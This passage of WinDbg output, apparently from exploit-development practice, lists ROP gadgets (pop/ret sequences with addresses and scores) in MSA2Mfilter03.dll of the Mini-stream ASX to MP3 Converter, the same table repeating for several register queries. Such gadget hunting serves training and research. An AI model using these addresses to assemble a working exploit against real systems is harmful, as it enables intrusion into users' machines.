0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          

0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          

0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret

0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret

0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret

0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret

0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret

0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret

0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret

0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret

0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret

0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret

0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret

0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret

0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret

0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret

0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret

0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret

@$osed().rop.query("capability", "LOAD_REGISTER", "ebx")                 : ROP Query: 21 rows

    title            : ROP Query

    rows             : ROP Query: 21 rows; expand rows[N] for details

    length           : 0x15

0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "esi")



=== ROP Query ===

Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               

----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------

0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          

0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          

0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          

0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          

0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          

0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret

0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret

0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret

0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret

0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret

0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret

0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret

0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret

0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret

0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret

0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret

0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret

0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret

0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret

0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret

0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret

@$osed().rop.query("capability", "LOAD_REGISTER", "esi")                 : ROP Query: 21 rows

    title            : ROP Query

    rows             : ROP Query: 21 rows; expand rows[N] for details

    length           : 0x15

0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "ecx")



=== ROP Query ===

Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               

----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------

0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          

0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          

0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          

0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          

0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          

0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret

0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret

0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret

0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret

0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret

0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret

0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret

0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret

0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret

0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret

0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret

0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret

0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret

0x10012443  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop edi ; ret

0x10028FDB  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebx ; ret

0x1005BE44  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edi ; pop ebp ; ret

@$osed().rop.query("capability", "LOAD_REGISTER", "ecx")                 : ROP Query: 21 rows

    title            : ROP Query

    rows             : ROP Query: 21 rows; expand rows[N] for details

    length           : 0x15
```

```text
0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "ebx")

=== ROP Query ===
Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               
----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------
0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          
0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          
0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          
0x1001062D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ebp ; ret          
0x10012444  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edi ; ret          
0x1002F696  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop ebp ; ret
0x1003023B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop eax ; pop esi ; ret
0x10028E7D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop ecx ; pop ecx ; ret
0x1005C16F  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebx ; ret
0x10032CB4  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop ebp ; ret
0x10029A70  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ecx ; pop esi ; ret
0x10031659  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, eax, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop eax ; ret
0x1002A0B1  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop ebp ; ret
0x1001A41B  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop esi ; ret
0x1001D0DD  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebx ; pop edi ; ret
0x1001096D  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop ebp ; pop ecx ; ret
0x100176E2  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ecx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ecx ; ret
0x1001062C  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop esi ; pop ebp ; ret
